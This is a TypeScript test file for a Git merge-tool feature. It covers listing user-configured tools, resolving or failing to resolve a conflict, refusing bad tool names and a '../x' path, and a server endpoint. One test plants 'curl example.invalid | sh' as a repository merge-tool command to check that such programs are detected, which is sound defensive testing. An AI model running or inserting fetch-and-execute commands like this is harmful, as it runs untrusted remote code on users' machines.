/**
 * A conflict resolved in the user's own merge tool: the tools Git can start (terminal-only ones left out, the
 * default first), a tool that resolves (staged, no backup files), one that closes without resolving (still in
 * conflict), refusals, a repository that names a merge tool program in its own settings, and through the server.
 */
import { test } from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { hasMarkers, mergeTools, runMergeTool } from '../src/git/mergeTool';
import { programsInRepoConfig } from '../src/git/repoConfig';
import { runGit } from '../src/git/run';

async function conflicted(tmp: string): Promise<string> {
    const dir = path.join(tmp, 'repo');
    await runGit(['init', '-q', '-b', 'main', dir], { cwd: tmp });
    const g = (a: string[]) => runGit(['-c', 'user.name=T', '-c', 'user.email=t@x.invalid', ...a], { cwd: dir, allowFailure: true });
    fs.writeFileSync(path.join(dir, 'shop.feature'), 'Feature: Shop\n  Scenario: Pay\n    Then the total is 10\n');
    await g(['add', '.']); await g(['commit', '-qm', 'base']);
    await g(['checkout', '-qb', 'other']);
    fs.writeFileSync(path.join(dir, 'shop.feature'), 'Feature: Shop\n  Scenario: Pay\n    Then the total is 12\n');
    await g(['commit', '-qam', 'theirs']);
    await g(['checkout', '-q', 'main']);
    fs.writeFileSync(path.join(dir, 'shop.feature'), 'Feature: Shop\n  Scenario: Pay\n    Then the total is 11\n');
    await g(['commit', '-qam', 'mine']);
    await g(['merge', 'other']);
    return dir;
}

test('the tools, resolving in one, closing another without resolving', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'mt-'));
    const prev = process.env.GIT_CONFIG_GLOBAL;
    // The user's own Git settings: two tools and a default.
    const global = path.join(tmp, 'gitconfig');
    fs.writeFileSync(global, ['[mergetool "takeTheirs"]', '\tcmd = cp \\"$REMOTE\\" \\"$MERGED\\"', '\ttrustExitCode = true', '[mergetool "lookOnly"]', '\tcmd = true', '[merge]', '\ttool = takeTheirs', ''].join('\n'));
    process.env.GIT_CONFIG_GLOBAL = global;
    try {
        const dir = await conflicted(tmp);
        const t = await mergeTools(dir, { vscode: true });
        assert.equal(t.default, 'takeTheirs');
        assert.equal(t.tools[0].name, 'takeTheirs');
        assert.ok(t.tools.some((x) => x.name === 'lookOnly' && x.userDefined));
        assert.ok(t.tools.some((x) => x.name === 'vscode' && x.label === 'Visual Studio Code'));
        assert.ok(!t.tools.some((x) => /vimdiff|emerge/.test(x.name)), 'no terminal tools');
        assert.ok(!(await mergeTools(dir, { vscode: false })).tools.some((x) => x.name === 'vscode'));
        // Closed without resolving: still in conflict.
        const r1 = await runMergeTool({ cwd: dir, file: 'shop.feature', tool: 'lookOnly', known: t.tools });
        assert.equal(r1.resolved, false);
        assert.match(r1.message, /still has conflict markers/);
        assert.ok(hasMarkers(fs.readFileSync(path.join(dir, 'shop.feature'), 'utf8')));
        // Resolved: the incoming side, staged, no backup files left.
        const r2 = await runMergeTool({ cwd: dir, file: 'shop.feature', tool: 'takeTheirs', known: t.tools });
        assert.equal(r2.resolved, true, r2.message);
        assert.equal(fs.readFileSync(path.join(dir, 'shop.feature'), 'utf8'), 'Feature: Shop\n  Scenario: Pay\n    Then the total is 12\n');
        assert.equal((await runGit(['ls-files', '-u'], { cwd: dir })).stdout.trim(), '');
        assert.deepEqual(fs.readdirSync(dir).filter((f) => /orig|BASE|LOCAL|REMOTE/.test(f)), []);
        await assert.rejects(runMergeTool({ cwd: dir, file: 'shop.feature', tool: 'takeTheirs', known: t.tools }), /no conflict to resolve/);
        await assert.rejects(runMergeTool({ cwd: dir, file: 'shop.feature', tool: 'rm-rf', known: t.tools }), /not a merge tool/);
        await assert.rejects(runMergeTool({ cwd: dir, file: '../x', tool: 'takeTheirs', known: t.tools }), /Invalid file/);
        // A merge tool program named in the repository's own settings is shown before the Studio works with it.
        await runGit(['config', 'mergetool.evil.cmd', 'curl example.invalid | sh'], { cwd: dir });
        assert.ok((await programsInRepoConfig(dir)).some((e) => e.key === 'mergetool.evil.cmd'));
    } finally {
        if (prev === undefined) delete process.env.GIT_CONFIG_GLOBAL; else process.env.GIT_CONFIG_GLOBAL = prev;
        fs.rmSync(tmp, { recursive: true, force: true });
    }
});

test('through the server: open, wait for the tool to close, resolved', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'mts-'));
    const prev = process.env.GIT_CONFIG_GLOBAL;
    const global = path.join(tmp, 'gitconfig');
    fs.writeFileSync(global, ['[mergetool "slowTheirs"]', '\tcmd = sleep 1 && cp \\"$REMOTE\\" \\"$MERGED\\"', '\ttrustExitCode = true', ''].join('\n'));
    process.env.GIT_CONFIG_GLOBAL = global;
    try {
        const dir = await conflicted(tmp);
        const { SecretStore } = await import('../src/secrets/store');
        const { KeyFileProtector } = await import('../src/secrets/protector');
        const store = new SecretStore(path.join(tmp, 'home'), new KeyFileProtector(path.join(tmp, 'home', 'keys', 'secrets.key')));
        const { createServer } = await import('../src/server/server');
        const s = createServer({ repoRoot: dir, store, userName: 'T', token: 'tk' });
        const call = async (url: string, payload?: object) => { const r = await s.app.inject({ method: payload ? 'POST' : 'GET', url, headers: { authorization: 'Bearer tk' }, ...(payload ? { payload } : {}) }); return { status: r.statusCode, json: JSON.parse(r.body) }; };
        try {
            assert.match((await call('/api/git/mergetool', { file: 'shop.feature', tool: 'nope' })).json.error, /not a merge tool/);
            const r = await call('/api/git/mergetool', { file: 'shop.feature', tool: 'slowTheirs' });
            assert.equal(r.status, 200, JSON.stringify(r.json));
            assert.equal(r.json.done, undefined, 'still open');
            assert.match((await call('/api/git/mergetool', { file: 'shop.feature', tool: 'slowTheirs' })).json.error, /already open in slowTheirs/);
            let done: { resolved: boolean } | undefined;
            for (let i = 0; i < 40 && !done; i++) { await new Promise((z) => setTimeout(z, 250)); done = (await call('/api/git/mergetools')).json.runs['shop.feature']?.done; }
            assert.equal(done?.resolved, true);
        } finally { await s.app.close(); }
    } finally {
        if (prev === undefined) delete process.env.GIT_CONFIG_GLOBAL; else process.env.GIT_CONFIG_GLOBAL = prev;
        fs.rmSync(tmp, { recursive: true, force: true });
    }
});
